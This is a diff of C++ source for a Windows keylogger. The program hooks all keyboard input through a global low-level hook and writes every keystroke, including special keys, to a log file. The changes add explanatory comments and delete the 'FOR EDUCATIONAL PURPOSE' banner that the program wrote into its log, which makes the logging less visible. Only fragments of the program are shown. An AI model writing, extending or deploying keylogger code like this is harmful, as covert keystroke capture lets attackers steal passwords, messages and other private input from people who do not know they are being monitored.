@@ -11,8 +11,6 @@ void logKeyStroke(int key) {
         return;
     }
 
-    logFile << "\n ======= FOR EDUCATIONAL PURPOSE ======= \n";
-
     // If key is BACKSPACE
     if(key == VK_BACK) {
         logFile << "[BACKSPACE]";
@@ -23,7 +21,7 @@ void logKeyStroke(int key) {
     else if (key == VK_TAB) {
         logFile << "[TAB]";
     }
-    else if (key == VK_SHIFT || key == VK_LSHIFT || key ==VK_RSHIFT ) {
+    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT ) {
         logFile << "[SHIFT]";
     }
     else if (key == VK_ESCAPE) {
@@ -57,12 +55,16 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main(){
+    // SetWindowsHookEx calls KeyboardProc
+    //type of hook WH_KEYBOARD_LL, Low-Level Keyboard Hook, captures all keyboard input 
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
     MSG msg;
 
+    // Windows Message Loop
+    // Getmessage retrieves messages (keyboard/mouse)
     while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
+        TranslateMessage(&msg);             // converting key presses into char message
         DispatchMessage(&msg);
     }
 
